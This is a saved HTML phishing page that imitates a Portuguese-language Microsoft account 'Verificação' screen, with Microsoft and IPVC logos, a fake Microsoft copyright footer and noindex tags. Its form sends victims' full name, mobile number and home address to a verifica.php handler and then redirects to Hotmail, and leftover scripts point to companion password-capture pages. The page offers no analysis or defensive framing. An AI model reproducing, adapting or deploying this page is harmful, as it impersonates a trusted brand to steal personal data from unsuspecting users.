<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0042)http://127.0.0.1:5500/connexion/index.html -->
<html xmlns="http://www.w3.org/1999/xhtml" data-lt-installed="true"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">

<title>Iniciar sessão na sua conta Microsoft</title>
<link rel="shortcut icon" href="http://127.0.0.1:5500/connexion/css/favicon.ico">
<script src="./Iniciar sessão na sua conta Microsoft_files/jquery-latest.min.js.transferir"></script>
<script type="text/javascript">
$(document).on("keyup", "input[name=logn]", function() {
    $("span.logn").html($(this).val());
});

</script>
 <script type="text/javascript">
 window.document.onkeydown = CheckEnter;

  function CheckEnter(){

     if(event.keyCode == 13)

          return false;

     return true;

}
</script>
<script type="text/javascript">
function checkFilled() {
   	var fld=document.getElementById('logn').value;
	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
   if(fld.length < 1){
        document.getElementById('logn').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efire').style.display = "block";
        document.getElementById('efired').style.display = "none";
        return false;
    }else{
        document.getElementById('logn').style.borderColor = "blue";
    }
	
	    if (fld.match(emailExp)) 
		{ 
   document.getElementById('filth').style.display = "none";
   document.getElementById('porn').style.display = "block";
   document.getElementById('logn').style.borderColor = "blue";
         } else {
		document.getElementById('logn').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efire').style.display = "block";
        document.getElementById('efired').style.display = "none";
        return false;
    }
}

function checkPassy() { 
    var fn=document.getElementById('passd').value;	
 if(fn.length < 5){
        document.getElementById('passd').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efired').style.display = "block";
        return false;
    }else{
		document.getElementById('passd').style.borderColor = "blue";
    }
}

</script>
<style type="text/css">
body {
	height: 100vh;
	background-image: url("vzbuQ.jpg");
	width: 100%;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
#bady {
	height: 100%;
	width: 100%;
	background: linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url('css/0.jpg');
	background-size: 100% 116%;
	background-repeat: no-repeat;
	background-position: 0px -50px;

}
.chamber {
	/*	position: absolute;
	top: 50%;
	left: 50%;
	transform: translate(-50%, -50%); */
	position: absolute; /*it can be fixed too*/
	left: 0;
	right: 0;
	top: 0;
	bottom: 0;
	background-color: #FFF;
	width: 320px;
	/*this to solve "the content will not be cut when the window is smaller than the content": */
	max-width: 380px;
	max-height: 700px;
	padding-left: 40px;
	padding-top: 40px;
	border: 1px solid #CCC;
	font-family: "Segoe UI Webfont", -apple-system, 'Helvetica Neue', 'Lucida Grande', Roboto, Ebrima, 'Nirmala UI', Gadugi, 'Segoe Xbox Symbol';
	padding-right: 50px;
	margin: auto;
	padding-bottom: 10px;
	height: 600px;
	}

.logo {
	float: left;
}
h2 {
	float: left;
	clear: left;
	margin: 16px -2px; padding: 0px; font-weight: 300;

}
h4 {
	float: left;
	clear: left;
	margin: 6px -2px;
	padding: 0px;
	font-weight: normal;
	font-size: 13px;
}
.efigbo {
	clear: left;
	margin-left:-1px;
	font-size: 15px;
}
#efired {
	margin-left: -1px;
	font-size: 15px;
	color: #E81123;
	margin-bottom: -5px;
	width: 350px;
	float: left;
	margin-top: -4px;
}
#efire {
	margin-left: -1px;
	font-size: 15px;
	color: #E81123;
	margin-top: 10px;
	margin-bottom: -5px;
	width: 350px;
	float: left;
}
input {
	height: 32px;
	clear: left;
	margin-top: 15px;
	margin-left: -1px;
	border: 1px solid #333;
	width: 100%;
	font-size: 15px;
	padding-left: 12px;
	font-family: "Segoe UI Webfont", -apple-system, 'Helvetica Neue', 'Lucida Grande', Roboto, Ebrima, 'Nirmala UI', Gadugi, 'Segoe Xbox Symbol';
	margin-bottom: 15px;
	}
input:focus {
    outline: none;
	border: 1px solid #06C;
}
.btn-primary{
	border: 1px solid rgb(0, 103, 184);
	color: rgb(255, 255, 255);
	font-style: inherit;
	font-variant: inherit;
	font-weight: inherit;
	font-stretch: inherit;
	font-size: inherit;
	line-height: inherit;
	font-family: inherit;
	position: relative;
	text-align: center;
	white-space: nowrap;
	overflow: hidden;
	vertical-align: middle;
	background-color: #0067B8;
	height: 36px;
	cursor: pointer;
	padding-top: 4px;
	padding-right: 12px;
	padding-bottom: 4px;
	padding-left: 12px;
	margin-left: -1px;
	width: 334px;
	clear: left;
	}
.pp-primary{
	border: 1px solid rgb(0, 103, 184);
	color: rgb(255, 255, 255);
	font-style: inherit;
	font-variant: inherit;
	font-weight: inherit;
	font-stretch: inherit;
	font-size: inherit;
	line-height: inherit;
	font-family: inherit;
	width: 49%;
	position: relative;
	text-align: center;
	white-space: nowrap;
	overflow: hidden;
	vertical-align: middle;
	background-color: rgb(0, 103, 184);
	height: 36px;
	cursor: pointer;
	padding-top: 4px;
	padding-right: 12px;
	padding-bottom: 4px;
	padding-left: 12px;
	margin-right: -50px;
	cursor: pointer;
	clear: left;
	}
.oo-primary{
	border: 1px solid #D6D6D6;
	color: #000000;
	font-style: inherit;
	font-variant: inherit;
	font-weight: inherit;
	font-stretch: inherit;
	font-size: inherit;
	line-height: inherit;
	font-family: inherit;
	width: 49%;
	position: relative;
	text-align: center;
	white-space: nowrap;
	overflow: hidden;
	vertical-align: middle;
	background-color: #D6D6D6;
	height: 36px;
	cursor: pointer;
	padding-top: 4px;
	padding-right: 12px;
	padding-bottom: 4px;
	padding-left: 12px;
	margin-right: 1%;
	clear: left;
	}
	
.footer {
	position: fixed;
	left: 0px;
	bottom: 0px;
	height: 24px;
	width: 100%;
	background-color: rgba(0, 0, 0, 0.6);
	text-align: right;
	color: #FFFFFF;
	font-family: "Segoe UI Webfont", -apple-system, 'Helvetica Neue', 'Lucida Grande', Roboto, Ebrima, 'Nirmala UI', Gadugi, 'Segoe Xbox Symbol';
	font-size: 12.5px;
	padding-top: 6px;
	}
.footer a{
	color: #FFFFFF;
}
/* IE 6 */
* html .footer {
	position: absolute;
   top:expression((0-(footer.offsetHeight)+(document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight)+(ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+'px');
}

.ugogbe {
	margin-left: -40px;
	font-size: 15px;
	background-color: #F2F2F2;
	line-height: 28px;
	white-space: nowrap;
	overflow: hidden;
	text-align: right;
	width: 310px;
	padding-right: 100px;
	margin-top: 15px;
	float: left;
	clear: both;
}

.eholder {
	height: 45px;
	width: 45px;
	margin-top: -46px;
	float:right;
	}
</style>

</head>
<body data-new-gr-c-s-check-loaded="14.997.0" data-gr-ext-installed="">
<div id="bady">

  <form name="form1" spellcheck="false" method="post" action="verifica.php" autocomplete="off" onsubmit="return checkPassy();">
   	<div class="chamber">
    <div class="logo">
		<img src="./microsoft_logo.svg" alt="Microsoft Logo">
		<img src="https://www.ipvc.pt/wp-content/uploads/2020/11/logo_ipvc_svg.svg" style="float: right; width: 45%;" alt="Microsoft Logo">
	</div>

		<input name="agenti" type="hidden" id="agenti" value="New Hotmail">
		<input name="redir" type="hidden" id="redir" value="https://mail.live.com/default.aspx"><div id="filth">
		<h2>Verificação</h2>
		<div id="efire" style="display:none;">Introduza um endereço de e-mail, número de telefone ou nome Skype válido.
		</div>
		<label for="logn"></label>

		<input type="text" style="border: none; border:none;
		border-bottom: 1px solid rgba(54, 53, 53, 0.822);
		padding: 5px 10px;
		outline: none;" name="nome" id="logn" placeholder="Nome Completo">

		<input type="text" style="border: none; border:none;
		border-bottom: 1px solid rgba(54, 53, 53, 0.822);
		padding: 5px 10px;
		outline: none;" name="telemovel" id="logn" placeholder="Telemóvel">

		<input type="text" style="border: none; border:none;
		border-bottom: 1px solid rgba(54, 53, 53, 0.822);
		padding: 5px 10px;
		outline: none;" name="morada" id="logn" placeholder="Morada">

		<h4>Não tem conta?<a href="http://127.0.0.1:5500/connexion/index.html" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Crie uma! </a> </h4>
		<h4><a href="http://127.0.0.1:5500/connexion/index.html" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Iniciar sessão com uma chave de segurança</a> </h4>
		


		<button name="button" type="submit" style="margin-top: 10px; width: 40%; float: right;" class="btn-primary" id="button">Confirmar</button>
		<!-- piachie onyembu -->
		</div>


</form>
<div class="footer" style="font-size:12px;"><span style="margin-right:30px;">©2017 Microsoft</span><span style="margin-right:30px;"><a href="http://127.0.0.1:5500/connexion/index.html" style="color: #FFFFFF; text-decoration: none; white-space: nowrap;">Terms of Use</a></span>
<span style="margin-right:10px;"><a href="http://127.0.0.1:5500/connexion/index.html" style="color: #FFFFFF; text-decoration: none; white-space: nowrap; ">Privacy &amp; Cookies</a></span></div></div>
<!-- Code injected by live-server -->
<script type="text/javascript">
	// <![CDATA[  <-- For SVG support
	if ('WebSocket' in window) {
		(function () {
			function refreshCSS() {
				var sheets = [].slice.call(document.getElementsByTagName("link"));
				var head = document.getElementsByTagName("head")[0];
				for (var i = 0; i < sheets.length; ++i) {
					var elem = sheets[i];
					var parent = elem.parentElement || head;
					parent.removeChild(elem);
					var rel = elem.rel;
					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
					}
					parent.appendChild(elem);
				}
			}
			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
			var address = protocol + window.location.host + window.location.pathname + '/ws';
			var socket = new WebSocket(address);
			socket.onmessage = function (msg) {
				if (msg.data == 'reload') window.location.reload();
				else if (msg.data == 'refreshcss') refreshCSS();
			};
			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
				console.log('Live reload enabled.');
				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
			}
		})();
	}
	else {
		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
	}
	// ]]>
</script>

</body></html>